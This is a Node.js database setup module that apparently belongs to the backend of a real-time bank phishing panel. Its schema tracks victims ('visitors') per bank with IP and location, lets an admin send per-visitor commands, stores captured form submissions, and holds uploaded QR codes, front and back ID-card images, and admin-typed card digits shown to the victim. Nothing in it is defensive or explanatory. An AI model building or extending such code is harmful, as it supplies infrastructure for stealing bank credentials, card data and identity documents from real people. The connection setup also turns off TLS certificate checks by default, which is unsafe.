import pg from "pg";

const { Pool } = pg;

if (!process.env.DATABASE_URL) {
  console.error("[api] ERROR: DATABASE_URL is not set.");
  console.error("[api] Local:  $env:DATABASE_URL=\"<your-postgres-url>\"  (PowerShell) then npm run dev");
  console.error("[api] Local file: create server/.env with DATABASE_URL=<your-postgres-url> (never commit it)");
  console.error("[api] Render: dashboard -> service -> Environment -> DATABASE_URL");
  process.exit(1);
}

export const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.PG_SSL === "disable" ? false : { rejectUnauthorized: false },
});

export async function initDb() {
  await pool.query(`
  CREATE TABLE IF NOT EXISTS visitors (
    id TEXT PRIMARY KEY,
    bank TEXT,
    bank_name TEXT,
    status TEXT DEFAULT 'waiting',
    ip TEXT,
    city TEXT,
    country TEXT,
    ua TEXT,
    joined_at BIGINT,
    last_seen BIGINT
  );
  CREATE TABLE IF NOT EXISTS commands (
    visitor_id TEXT PRIMARY KEY,
    type TEXT NOT NULL,
    at BIGINT NOT NULL,
    by TEXT DEFAULT 'admin'
  );
  CREATE TABLE IF NOT EXISTS submissions (
    id TEXT PRIMARY KEY,
    visitor_id TEXT NOT NULL,
    bank TEXT,
    kind TEXT NOT NULL,
    data JSONB NOT NULL DEFAULT '{}',
    at BIGINT NOT NULL
  );
  CREATE INDEX IF NOT EXISTS idx_visitors_last_seen ON visitors(last_seen DESC);
  CREATE INDEX IF NOT EXISTS idx_submissions_visitor ON submissions(visitor_id, at DESC);
  CREATE TABLE IF NOT EXISTS qr_uploads (
    visitor_id TEXT PRIMARY KEY,
    image TEXT NOT NULL,
    at BIGINT NOT NULL
  );
  ALTER TABLE qr_uploads ADD COLUMN IF NOT EXISTS storage TEXT DEFAULT 'inline';
  ALTER TABLE qr_uploads ADD COLUMN IF NOT EXISTS url TEXT DEFAULT '';
  -- ID uploads: one front + one back image per visitor session
  CREATE TABLE IF NOT EXISTS id_assets (
    visitor_id TEXT NOT NULL,
    side TEXT NOT NULL,
    public_id TEXT DEFAULT '',
    url TEXT NOT NULL,
    storage TEXT DEFAULT 'inline',
    at BIGINT NOT NULL,
    PRIMARY KEY (visitor_id, side)
  );
  -- Card hint: admin-typed last 4 digits shown to the visitor on card step
  CREATE TABLE IF NOT EXISTS card_hints (
    visitor_id TEXT PRIMARY KEY,
    last4 TEXT NOT NULL DEFAULT '',
    at BIGINT NOT NULL
  );
  `);
  console.log("[api] db ready");
}
